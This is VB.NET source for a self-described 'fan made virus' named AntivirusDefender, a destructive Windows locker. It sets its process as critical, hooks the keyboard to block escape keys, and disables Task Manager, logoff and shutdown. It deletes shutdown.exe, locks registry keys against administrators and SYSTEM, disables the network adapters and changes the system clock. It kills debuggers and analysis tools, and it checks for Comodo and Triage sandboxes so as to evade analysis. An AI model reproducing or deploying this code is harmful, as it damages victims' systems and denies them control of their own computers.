Imports System.ComponentModel
Imports System.IO
Imports System.Management
Imports System.Runtime.InteropServices
Imports System.Security.AccessControl
Imports System.Security.Principal
Imports System.Text
Imports System.Threading
Imports Microsoft.Win32
Imports System.Threading.Tasks

Public Class Form1
    Inherits Form

    ' Constants for keyboard hook
    Private Const WH_KEYBOARD_LL As Integer = 13
    Private Const WM_KEYDOWN As Integer = &H100
    ' Hook handle and callback delegate
    Private Shared hookId As IntPtr = IntPtr.Zero
    Private hookCallbackDelegate As HookProc

    ' Delegate for hook callback
    Private Delegate Function HookProc(nCode As Integer, wParam As IntPtr, lParam As IntPtr) As IntPtr

    ' Correct declaration
    Dim fullScreenOverlay As New Form2()

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Try
            InitializeComponent()

            ' Set the process as critical
            Dim cp As New CriticalProcess()
            Try
                cp.SetProcessCritical()
            Catch ex As Exception
                Console.WriteLine("Error setting process to critical: " & ex.Message)
            End Try

            FormBorderStyle = FormBorderStyle.None
            StartPosition = FormStartPosition.CenterScreen

            ' Set up the low-level keyboard hook
            hookCallbackDelegate = New HookProc(AddressOf HookCallback)
            hookId = SetHook(hookCallbackDelegate) ' Initialize hookID here

            ' Grant self permissions
            Try
                GrantSelfPermissions()
            Catch ex As Exception
                Console.WriteLine("Error in GrantSelfPermissions: " & ex.Message)
            End Try

        Catch ex As Exception
            MessageBox.Show("An error occurred during initialization: " & ex.Message, "Initialization Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
    End Sub

    ' Windows API declarations
    <DllImport("kernel32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
    Private Shared Function GetModuleHandle(lpModuleName As String) As IntPtr
    End Function

    <DllImport("user32.dll")>
    Private Shared Function SetWindowsHookEx(idHook As Integer, lpfn As HookProc, hMod As IntPtr, dwThreadId As UInteger) As IntPtr
    End Function

    ' Set up the low-level keyboard hook
    Private Function SetHook(proc As HookProc) As IntPtr
        Using curProc As Process = Process.GetCurrentProcess()
            Using curModule As ProcessModule = curProc.MainModule
                Return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(Nothing), 0)
            End Using
        End Using
    End Function

    ' Declare the SYSTEMTIME structure for setting the date
    <StructLayout(LayoutKind.Sequential)>
    Private Structure SYSTEMTIME
        Public wYear As UShort
        Public wMonth As UShort
        Public wDayOfWeek As UShort
        Public wDay As UShort
        Public wHour As UShort
        Public wMinute As UShort
        Public wSecond As UShort
        Public wMilliseconds As UShort
    End Structure

    ' Declare the SetLocalTime API function
    <DllImport("kernel32.dll", SetLastError:=True)>
    Private Shared Function SetLocalTime(ByRef time As SYSTEMTIME) As Boolean
    End Function

    <DllImport("user32.dll")>
    Private Shared Function CallNextHookEx(hhk As IntPtr, nCode As Integer, wParam As IntPtr, lParam As IntPtr) As IntPtr
    End Function

    <DllImport("kernel32")>
    Private Shared Function CloseHandle(hObject As IntPtr) As Boolean
    End Function

    Public Class CriticalProcess

        ' Imports for DLL functions
        <DllImport("advapi32.dll", SetLastError:=True, CharSet:=CharSet.Unicode)>
        Private Shared Function LookupPrivilegeValue(lpSystemName As String, lpName As String, ByRef lpLuid As LUID) As Boolean
        End Function

        <DllImport("advapi32.dll", SetLastError:=True)>
        Private Shared Function AdjustTokenPrivileges(TokenHandle As IntPtr, DisableAllPrivileges As Boolean, ByRef NewState As TokenPrivileges, BufferLength As UInt32, ByRef PreviousState As TokenPrivileges, ByRef ReturnLength As UInt32) As Boolean
        End Function

        <DllImport("ntdll.dll", SetLastError:=True)>
        Private Shared Function RtlSetProcessIsCritical(IsCritical As Boolean, IsShutdownInPlace As Boolean, Reserved As IntPtr) As Boolean
        End Function

        <DllImport("kernel32.dll", SetLastError:=True)>
        Private Shared Function GetCurrentProcess() As IntPtr
        End Function

        <DllImport("kernel32.dll", SetLastError:=True)>
        Private Shared Function OpenProcessToken(ProcessHandle As IntPtr, DesiredAccess As UInt32, ByRef TokenHandle As IntPtr) As Boolean
        End Function

        ' Structures
        <StructLayout(LayoutKind.Sequential)>
        Private Structure LUID
            Public LowPart As UInteger
            Public HighPart As Integer
        End Structure

        <StructLayout(LayoutKind.Sequential)>
        Private Structure LUIDAndAttributes
            Public Luid As LUID
            Public Attributes As UInteger
        End Structure

        <StructLayout(LayoutKind.Sequential)>
        Private Structure TokenPrivileges
            Public PrivilegeCount As UInteger
            <MarshalAs(UnmanagedType.ByValArray, SizeConst:=1)>
            Public Privileges() As LUIDAndAttributes
        End Structure

        ' Constants
        Private Const SE_DEBUG_NAME As String = "SeDebugPrivilege"
        Private Const SE_PRIVILEGE_ENABLED As UInteger = &H2
        Private Const TOKEN_ADJUST_PRIVILEGES As UInteger = &H20
        Private Const TOKEN_QUERY As UInteger = &H8

        ' Methods
        Private Sub SetDebugPrivilege()
            Dim processHandle As IntPtr = GetCurrentProcess()
            Dim tokenHandle As IntPtr = IntPtr.Zero

            If OpenProcessToken(processHandle, TOKEN_ADJUST_PRIVILEGES Or TOKEN_QUERY, tokenHandle) Then
                Dim luid As New LUID()
                If LookupPrivilegeValue(Nothing, SE_DEBUG_NAME, luid) Then
                    Dim tp As New TokenPrivileges With {
                    .PrivilegeCount = 1,
                    .Privileges = New LUIDAndAttributes(0) {}
                }
                    tp.Privileges(0) = New LUIDAndAttributes With {
                    .Luid = luid,
                    .Attributes = SE_PRIVILEGE_ENABLED
                }

                    Dim returnLength As UInteger = 0
                    AdjustTokenPrivileges(tokenHandle, False, tp, Marshal.SizeOf(tp), Nothing, returnLength)
                End If
            End If

            CloseHandle(tokenHandle)
        End Sub

        Public Sub SetProcessCritical()
            SetDebugPrivilege()

            If RtlSetProcessIsCritical(True, False, IntPtr.Zero) Then
                ' Process has been set to critical
            Else
                Dim err As Integer = Marshal.GetLastWin32Error()
                Throw New Win32Exception(err)
            End If
        End Sub

    End Class

    ' Declare the GetAsyncKeyState function
    <DllImport("user32.dll")>
    Private Shared Function GetAsyncKeyState(vKey As Integer) As Short
    End Function

    Private Const VK_MENU As Integer = &H12 ' Alt key
    Private Const VK_TAB As Integer = &H9
    Private Const VK_F4 As Integer = &H73 ' Virtual Key Code for F4
    Private Const VK_LWIN As Integer = &H5B ' Left Windows Key
    Private Const VK_RWIN As Integer = &H5C ' Right Windows Key

    ' Flag to prevent recursion
    Private isBlockingKey As Boolean = False

    ' Hook callback function
    Private Function HookCallback(nCode As Integer, wParam As IntPtr, lParam As IntPtr) As IntPtr
        ' Check for key press event (WM_KEYDOWN)
        If nCode >= 0 AndAlso wParam = CType(WM_KEYDOWN, IntPtr) Then
            Dim vkCode As Integer = Marshal.ReadInt32(lParam)

            ' Prevent Windows key press events to avoid interfering with OS functionality
            If vkCode = VK_LWIN Or vkCode = VK_RWIN Then
                Return CType(1, IntPtr) ' Block the key press
            End If

            ' Prevent Alt + Tab combination
            If vkCode = VK_TAB AndAlso (GetAsyncKeyState(VK_MENU) And &H8000) <> 0 Then
                If Not isBlockingKey Then
                    isBlockingKey = True ' Block recursive calls
                    Return CType(1, IntPtr) ' Prevent the Alt+Tab combination
                End If
            End If

            ' Prevent Alt + F4
            If vkCode = VK_F4 AndAlso (GetAsyncKeyState(VK_MENU) And &H8000) <> 0 Then
                If Not isBlockingKey Then
                    isBlockingKey = True ' Block recursive calls
                    Return CType(1, IntPtr) ' Prevent Alt + F4
                End If
            End If
        End If

        ' Continue with the next hook if no key was blocked
        Return CallNextHookEx(hookId, nCode, wParam, lParam)
    End Function

    ' Prevent form from closing
    Protected Overrides Sub OnFormClosing(e As FormClosingEventArgs)
        e.Cancel = True
    End Sub

    ' Override ProcessCmdKey to handle specific keys
    Protected Overrides Function ProcessCmdKey(ByRef msg As Message, keyData As Keys) As Boolean
        ' Prevent specific key combinations
        If keyData = (Keys.Control Or Keys.Delete) Then
            Return True
        End If

        Return MyBase.ProcessCmdKey(msg, keyData)
    End Function

    Public Sub DisableLogoffSwitchUserAndShutdown()
        ' Registry paths
        Dim explorerRegPath As String = "Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
        Dim systemRegPath As String = "Software\Microsoft\Windows\CurrentVersion\Policies\System"

        Try
            ' Open or create the registry key for Explorer policies
            Using explorerRegKey As RegistryKey = Registry.CurrentUser.CreateSubKey(explorerRegPath, RegistryKeyPermissionCheck.ReadWriteSubTree)
                ' Set NoLogoff key to 1 (disable Logoff)
                explorerRegKey.SetValue("NoLogoff", 1, RegistryValueKind.DWord)
                ' Set NoClose key to 1 (disable Shut Down/Restart)
                explorerRegKey.SetValue("NoClose", 1, RegistryValueKind.DWord)
            End Using

            ' Open or create the registry key for System policies (Disable Task Manager)
            Using systemRegKey As RegistryKey = Registry.CurrentUser.CreateSubKey(systemRegPath, RegistryKeyPermissionCheck.ReadWriteSubTree)
                ' Set DisableTaskMgr key to 1 (disable Task Manager)
                systemRegKey.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord)
                ' Set HideFastUserSwitching key to 1 (disable Switch User)
                systemRegKey.SetValue("HideFastUserSwitching", 1, RegistryValueKind.DWord)
            End Using

        Catch ex As Exception
            MessageBox.Show("An error occurred while modifying registry keys: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
    End Sub

    ' Update registry settings
    Private Sub UpdateRegistrySettings()
        Try
            ' Change the EnableLUA key
            Dim regKeyPath As String = "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
            Using regKey As RegistryKey = Registry.LocalMachine.OpenSubKey(regKeyPath, True)
                ' Set EnableLUA key to 1 if regKey is not null
                regKey.SetValue("EnableLUA", 1, RegistryValueKind.DWord)
            End Using

            ' Lock the registry key
            LockRegistryKey(regKeyPath)

        Catch ex As Exception
            Console.WriteLine("An error occurred while updating UAC: " & ex.Message)
        End Try
    End Sub

    Private Sub LockRegistryKey(keyPath As String)
        Try
            ' Open the registry key with permission to change security
            Using key As RegistryKey = Registry.LocalMachine.OpenSubKey(keyPath, RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.ChangePermissions)
                If key IsNot Nothing Then
                    ' Get the current security settings
                    Dim security As RegistrySecurity = key.GetAccessControl()

                    ' Remove all access to the key
                    Dim everyone As New SecurityIdentifier(WellKnownSidType.WorldSid, Nothing)
                    Dim system As New SecurityIdentifier(WellKnownSidType.LocalSystemSid, Nothing)
                    Dim admins As New SecurityIdentifier(WellKnownSidType.BuiltinAdministratorsSid, Nothing)

                    ' Purge existing access rules
                    security.PurgeAccessRules(everyone)
                    security.PurgeAccessRules(system)
                    security.PurgeAccessRules(admins)

                    ' Remove all access rights for everyone, system, and admins
                    security.AddAccessRule(New RegistryAccessRule(everyone, RegistryRights.FullControl, AccessControlType.Deny))
                    security.AddAccessRule(New RegistryAccessRule(system, RegistryRights.FullControl, AccessControlType.Deny))
                    security.AddAccessRule(New RegistryAccessRule(admins, RegistryRights.FullControl, AccessControlType.Deny))

                    ' Apply the changes to the registry key
                    key.SetAccessControl(security)
                End If
            End Using

        Catch ex As Exception
            MessageBox.Show("An error occurred while lock: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
    End Sub

    ' Execute a system command
    Public Sub ExecuteCommand(command As String)
        Try
            Dim process As New Process()
            process.StartInfo.FileName = "cmd.exe"
            process.StartInfo.Arguments = "/C " & command
            process.StartInfo.UseShellExecute = False
            process.StartInfo.RedirectStandardOutput = True
            process.StartInfo.RedirectStandardError = True
            process.StartInfo.CreateNoWindow = True ' Do not create a window
            process.Start()

            ' Read the output and error streams
            Dim output As String = process.StandardOutput.ReadToEnd()
            Dim errorOutput As String = process.StandardError.ReadToEnd()

            process.WaitForExit()

            ' Output command results to console
            If Not String.IsNullOrEmpty(output) Then
                Console.WriteLine("Output: " & output)
            End If
            If Not String.IsNullOrEmpty(errorOutput) Then
                Console.WriteLine("Error: " & errorOutput)
            End If
        Catch ex As Exception
            Console.WriteLine("Command execution failed: " & ex.Message)
        End Try
    End Sub

    ' Import SystemParametersInfo function to set wallpaper
    <DllImport("user32.dll", CharSet:=CharSet.Auto)>
    Private Shared Function SystemParametersInfo(uAction As UInteger, uParam As UInteger, lpvParam As String, fuWinIni As UInteger) As Boolean
    End Function

    ' Constants foar setting wallpaper
    Private Const SPI_SETDESKWALLPAPER As Integer = 20
    Private Const SPIF_UPDATEINIFILE As Integer = &H1
    Private Const SPIF_SENDCHANGE As Integer = &H2

    ' Function to convert byte array to Image
    Private Function ByteArrayToImage(byteArray As Byte()) As Image
        Using ms As New MemoryStream(byteArray)
            Return Image.FromStream(ms)
        End Using
    End Function

    ' Function to set the wallpaper
    Public Sub SetWallpaper()
        Try
            ' Load the antivirusdefenderwall image from resources as a byte array
            Dim wallpaperBytes As Byte() = My.Resources.Resource1.antivirusdefenderwall

            ' Check if the wallpaper data is valid
            If wallpaperBytes Is Nothing OrElse wallpaperBytes.Length = 0 Then
                MessageBox.Show("Error: Wallpaper data is not available.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
                Return
            End If

            ' Save the byte array directly to a temporary file
            Dim wallpaperTempPath As String = Path.Combine(Path.GetTempPath(), "ANTIVIRUSDEFENDERWALL.jpg")
            File.WriteAllBytes(wallpaperTempPath, wallpaperBytes)

            ' Set the wallpaper
            If Not SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, wallpaperTempPath, SPIF_UPDATEINIFILE Or SPIF_SENDCHANGE) Then
                Console.WriteLine("Error: Unable to set wallpaper.")
                Return
            End If

            ' Prevent changing the wallpaper by modifying the registry
            Using key As RegistryKey = Registry.CurrentUser.OpenSubKey("Control Panel\Desktop", True)
                key.SetValue("NoChangingWallpaper", 1, RegistryValueKind.DWord)
            End Using

            ' Update file icon appearance
            UpdateAllFileIcons()

        Catch ex As Exception
            Console.WriteLine("An error occurred while setting the wallpaper: " & ex.Message)
        End Try
    End Sub

    ' Helper metho0d to save an image to a file
    Private Sub SaveImageToFile(image As Image, filePath As String)
        Using fs As New FileStream(filePath, FileMode.Create, FileAccess.Write)
            image.Save(fs, Imaging.ImageFormat.Png)
        End Using
    End Sub

    Public Sub UpdateAllFileIcons()
        Try
            ' Define a path for the temporary .ico file
            Dim iconIcoPath As String = Path.Combine(Path.GetTempPath(), "app_icon.ico")

            ' Save the form's icon as a .ico file
            Using fs As New FileStream(iconIcoPath, FileMode.Create)
                Icon.Save(fs) ' Ensure the form has an icon assigned
            End Using

            ' Icon path in registry format
            Dim iconPath As String = """" & iconIcoPath & """,0"

            ' Registry keys for DefaultIcon in HKEY_CLASSES_ROOT
            Dim regKeys As String() = {
            "txtfile\DefaultIcon",
            "exefile\DefaultIcon",
            "mp3file\DefaultIcon",
            "mp4file\DefaultIcon",
            "themefile\DefaultIcon"
        }

            ' Update DefaultIcon for each key in HKEY_CLASSES_ROOT
            For Each regKey In regKeys
                UpdateRegistryKey(Registry.ClassesRoot, regKey, iconPath)
            Next

        Catch ex As Exception
            MessageBox.Show("An error occurred while updating file icons: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
    End Sub

    Private Sub UpdateRegistryKey(baseHive As RegistryKey, subKey As String, iconPath As String)
        Try
            ' Create or open the key with write access directly
            Using key As RegistryKey = baseHive.CreateSubKey(subKey, True)
                ' Directly set the value for the specified subkey, overwriting any existing value
                key.SetValue("", iconPath, RegistryValueKind.String) ' Use empty string if default value is intended
            End Using

            ' Lock the registry key path
            LockRegistryKey(subKey)

        Catch ex As Exception
            ' Silently catch any exceptions to avoid displaying error messages
            ' Errors are ignored to prevent interruptions in the process
        End Try
    End Sub

    ' Disconnect the Internet by disabling all network adapters
    Private Sub DisconnectInternet()
        Try
            Dim networkManagement As New ManagementClass("Win32_NetworkAdapter")
            Dim networkAdapters As ManagementObjectCollection = networkManagement.GetInstances()
            For Each adapter As ManagementObject In networkAdapters
                If CBool(adapter("NetEnabled")) Then
                    ' Disable the network adapter
                    adapter.InvokeMethod("Disable", Nothing)
                    Console.WriteLine("Disabled adapter: " & adapter("Name"))
                End If
            Next
        Catch ex As Exception
            Console.WriteLine("Failed to disable network adapters: " & ex.Message)
        End Try
    End Sub

    Public Sub KillGrantAccessAndDeleteShutdownExe()
        ' Path to shutdown.exe in System32
        Dim shutdownExePath As String = "C:\Windows\System32\shutdown.exe"

        ' Step 1: Kill any running instances of shutdown.exe
        Dim processes = Process.GetProcessesByName("shutdown")
        For Each proc In processes
            Try
                If Not proc.HasExited Then
                    proc.Kill() ' Kill the process
                    proc.WaitForExit() ' Wait for the process to exit
                    Console.WriteLine("Successfully killed shutdown.exe process.")
                End If
            Catch ex As Exception
                Console.WriteLine("Could not kill process: " & ex.Message)
            End Try
        Next

        ' Step 2: Grant full access to shutdown.exe to ensure we can delete it
        Try
            Dim grantAccessCmd As String = "icacls """ & shutdownExePath & """ /grant *S-1-1-0:(F)"
            ExecuteCommand(grantAccessCmd)
            Console.WriteLine("Successfully granted access to shutdown.exe.")
        Catch ex As UnauthorizedAccessException
            Console.WriteLine("Access denied when trying to grant permissions: " & ex.Message)
        Catch ex As Exception
            Console.WriteLine("Error while granting access: " & ex.Message)
        End Try

        ' Step 3: Delete shutdown.exe
        Try
            If File.Exists(shutdownExePath) Then
                File.Delete(shutdownExePath)
                Console.WriteLine("shutdown.exe deleted successfully.")
            Else
                Console.WriteLine("shutdown.exe not found.")
            End If
        Catch ex As Exception
            Console.WriteLine("Error while deleting shutdown.exe: " & ex.Message)
        End Try
    End Sub

    Private Function TriageCheck() As Boolean
        Try
            Dim processInfo As New ProcessStartInfo("wmic", "diskdrive get model") With {
            .RedirectStandardOutput = True,
            .UseShellExecute = False,
            .CreateNoWindow = True
        }
            Using process As Process = Process.Start(processInfo)
                Using reader As New StreamReader(process.StandardOutput.BaseStream)
                    Dim output As String = reader.ReadToEnd()
                    process.WaitForExit()

                    If output.Contains("DADY HARDDISK") OrElse output.Contains("QEMU HARDDISK") Then
                        Return True
                    End If
                End Using
            End Using
        Catch ex As Exception
            Console.WriteLine("Error running wmic command: " & ex.Message)
        End Try

        Return False
    End Function

    ' Check if the application is running with administrator privileges
    Private Function IsAdministrator() As Boolean
        Dim identity = WindowsIdentity.GetCurrent()
        Dim principal = New WindowsPrincipal(identity)
        Return principal.IsInRole(WindowsBuiltInRole.Administrator)
    End Function

    ' Set system time to January 19, 2038
    Private Sub SetSystemTimeTo2038()
        Try
            Dim newDateTime As New SYSTEMTIME With {
                .wYear = 2038,
                .wMonth = 1,
                .wDay = 19,
                .wHour = 3,
                .wMinute = 14,
                .wSecond = 7
            }

            ' Set system time using WinAPI
            If Not SetLocalTime(newDateTime) Then
                Throw New System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error())
            End If
        Catch ex As Exception
            Console.WriteLine("Failed to set system time: " & ex.Message)
        End Try
    End Sub

    ' Grant permissions to self
    Private Sub GrantSelfPermissions()
        Try
            ' Get the current directory and executable name
            Dim currentDir As String = AppDomain.CurrentDomain.BaseDirectory
            Dim currentName As String = Process.GetCurrentProcess().MainModule.FileName

            ' Create the command with actual paths
            Dim command As String = "icacls """ & currentDir & Path.GetFileName(currentName) & """ /grant Everyone:(OI)(CI)F"

            ExecuteCommand(command)
        Catch ex As Exception
            MessageBox.Show("Failed to grant self permissions: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
    End Sub

    ' Importing user32.dll for window management and input control
    <DllImport("user32.dll", SetLastError:=True)>
    Private Shared Function SetForegroundWindow(hWnd As IntPtr) As Boolean
    End Function

    <DllImport("user32.dll")>
    Private Shared Sub keybd_event(bVk As Byte, bScan As Byte, dwFlags As UInteger, dwExtraInfo As UInteger)
    End Sub

    ' Virtual key codes for letters and special characters (adjust for specific needs)
    Private Shared Sub SendKey(key As Char)
        Dim keyCode As Byte = AscW(key)
        keybd_event(keyCode, 0, KEYEVENTF_KEYDOWN, 0)
        Thread.Sleep(50) ' Short delay between keypresses
        keybd_event(keyCode, 0, KEYEVENTF_KEYUP, 0)
    End Sub

    ' Keycodes used by keybd_event
    Private Const KEYEVENTF_KEYDOWN As UInteger = &H0
    Private Const KEYEVENTF_KEYUP As UInteger = &H2


    ' Function to type a full message in Notepad
    Public Sub WriteMessageToNotepad()
        Try
            ' Start the Notepad process
            Dim notepadProcess As Process = Process.Start("notepad.exe")

            ' Wait for Notepad to be ready for input
            notepadProcess.WaitForInputIdle()

            ' Get the handle of the Notepad window
            Dim notepadHandle As IntPtr = notepadProcess.MainWindowHandle

            ' Bring Notepad to the foreground
            SetForegroundWindow(notepadHandle)

            ' Wait a moment to ensure Notepad has focus
            Thread.Sleep(500)

            ' Message to type
            Dim message As String = "one of the greatest fan made viruses ever created. his name is AntivirusDefender and there is no escape. i'm serious."

            ' Simulate typing the message with a delay to avoid collision with other keyboard input
            For Each c As Char In message
                SendKeys.SendWait(c.ToString())
                Thread.Sleep(100) ' Add a small delay between characters to ensure accuracy
            Next

        Catch ex As Exception
            Console.WriteLine("Failed to write message to Notepad: " & ex.Message)
        End Try
    End Sub

    ' Event handler for the Activate button
    Private Sub ActivateButton_Click(sender As Object, e As EventArgs) Handles ActivateButton.Click
        Dim secretKey As String = "FUCKTHESKIDDERS"

        ' Create an instance of the ComodoAntivirusDetector class
        Dim detectors As New Form2.StupidSandboxThingsDetector()

        ' Check if Comodo Antivirus is detected
        If detectors.DetectComodoAntivirus() Then
            MessageBox.Show("ARE YOU FUCKING SERIOUS? ARE YOU USING COMODO? COMODO ALREADY BEATEN BY ANTIVIRUSDEFENDER 6.6.6", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning)
            Return
        End If

        ' Check if the specific hard disk models are detected
        Dim isDetected As Boolean = TriageCheck()

        If isDetected Then
            MessageBox.Show("I WANT TO SAY SOMETHING. TRIAGE IS BULLSHIT. NO DATA FOR JAFFACAKES118.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning)
            Return
        End If

        If inputTextBox.Text = secretKey Then
            MessageBox.Show("Malware Activated!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information)

            ' Disable the Exit and Activate buttons on the main UI thread
            If ExitButton.InvokeRequired Then
                ExitButton.Invoke(Sub()
                                      ExitButton.Enabled = False
                                      ActivateButton.Enabled = False
                                  End Sub)
            Else
                ExitButton.Enabled = False
                ActivateButton.Enabled = False
            End If

            fullScreenOverlay.Show()

            ' 1. Disconnect the Internet
            DisconnectInternet()

            ' 2. Set the system time to 2038
            SetSystemTimeTo2038()

            Try
                LongRunningTask()
            Catch ex As Exception
                Console.WriteLine("Error in ExecutePayloadWork: " & ex.Message)
            End Try

        Else
            MessageBox.Show("Incorrect key. Please try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End If
    End Sub

    Private Sub LongRunningTask()
        Task.Factory.StartNew(Sub()
                                  ExecutePayload()
                              End Sub)
    End Sub

    Private Sub KillExplorerAndMore()
        Try
            ' List of process names to kill
            Dim processesToKill As String() = {
            "taskmgr.exe", "process.exe", "processhacker.exe",
            "ksdumper.exe", "fiddler.exe", "httpdebuggerui.exe", "wireshark.exe",
            "httpanalyzerv7.exe", "decoder.exe", "regedit.exe", "procexp.exe",
            "dnspy.exe", "vboxservice.exe", "burpsuite.exe", "DbgX.Shell.exe",
            "ILSpy.exe", "ollydbg.exe", "x32dbg.exe", "x64dbg.exe",
            "gdb.exe", "idaq.exe", "idag.exe", "idaw.exe",
            "ida64.exe", "idag64.exe", "idaw64.exe", "idaq64.exe",
            "windbg.exe", "immunitydebugger.exe", "windasm.exe", "systeminformer.exe"
        }

            ' Kill the processes
            For Each processName In processesToKill
                Try
                    Dim processes = Process.GetProcessesByName(Path.GetFileNameWithoutExtension(processName))
                    For Each proc In processes
                        If Not proc.HasExited Then
                            proc.Kill() ' Kill the process
                        End If
                    Next
                Catch ex As Exception
                    Console.WriteLine("Could not kill process " & processName & ": " & ex.Message)
                End Try
            Next

        Catch ex As Exception
            Console.WriteLine("An error occurred: " & ex.Message)
        End Try
    End Sub

    ' Event handler for FullScreenOverlay form closure
    Private Sub OnOverlayFormClosed(sender As Object, e As EventArgs)
        fullScreenOverlay = Nothing
    End Sub

    ' Method to execute the payload
    Private Sub ExecutePayload()
        Try
            ' Kill Explorer and related processes
            Task.Factory.StartNew(Sub()
                                      KillExplorerAndMore()
                                  End Sub)

            ' Set wallpaper with error handling
            Try
                Task.Factory.StartNew(Sub()
                                          SetWallpaper()
                                      End Sub)
            Catch ex As Exception
                MessageBox.Show("Error in SetWallpaper: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
            End Try

            ' Write a message to Notepad with error handling
            Try
                Task.Factory.StartNew(Sub()
                                          WriteMessageToNotepad()
                                      End Sub)
            Catch ex As Exception
                MessageBox.Show("Error in WriteMessageToNotepad: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
            End Try

            ' Kill grant access and delete shutdown executable
            Try
                Task.Factory.StartNew(Sub()
                                          KillGrantAccessAndDeleteShutdownExe()
                                      End Sub)
            Catch ex As Exception
                MessageBox.Show("Error in KillGrantAccessAndDeleteShutdownExe: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
            End Try

            ' Update registry settings with error handling
            Try
                Task.Factory.StartNew(Sub()
                                          UpdateRegistrySettings()
                                      End Sub)
            Catch ex As Exception
                MessageBox.Show("Error in UpdateRegistrySettings: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
            End Try

            ' Disable logoff, switch user, and shutdown options
            Try
                Task.Factory.StartNew(Sub()
                                          DisableLogoffSwitchUserAndShutdown()
                                      End Sub)
            Catch ex As Exception
                MessageBox.Show("Error in DisableLogoffSwitchUserAndShutdown: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
            End Try

        Catch ex As Exception
            ' General exception handling for the entire ExecutePayload method
            MessageBox.Show("An error occurred in ExecutePayload: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
    End Sub


    ' Event handler for the Exit button
    Private Sub ExitButton_Click(sender As Object, e As EventArgs) Handles ExitButton.Click
        ' Forceful exit
        Environment.Exit(0)
    End Sub
End Class